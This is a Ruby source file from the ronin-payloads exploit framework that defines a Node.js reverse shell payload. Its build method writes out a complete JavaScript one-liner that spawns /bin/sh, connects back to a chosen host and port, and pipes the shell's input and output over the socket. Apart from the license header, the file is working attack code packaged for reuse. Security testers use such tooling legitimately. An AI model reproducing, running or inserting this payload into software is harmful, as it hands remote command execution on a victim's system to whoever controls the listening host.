# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2025 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/node_js_payload'
require 'ronin/payloads/mixins/reverse_shell'

module Ronin
  module Payloads
    module JS
      module Node
        #
        # A basic node.js JavaScript reverse shell.
        #
        # @since 0.2.0
        #
        class ReverseShell < NodeJSPayload

          include Mixins::ReverseShell

          register 'js/node/reverse_shell'

          description <<~DESC
            A basic node.js JavaScript reverse shell.
          DESC

          #
          # Builds the node.js JavaScript reverse shell payload.
          #
          def build
            @payload = %{(function(){var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(#{port}, #{host.dump}, function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();}
          end

        end
      end
    end
  end
end
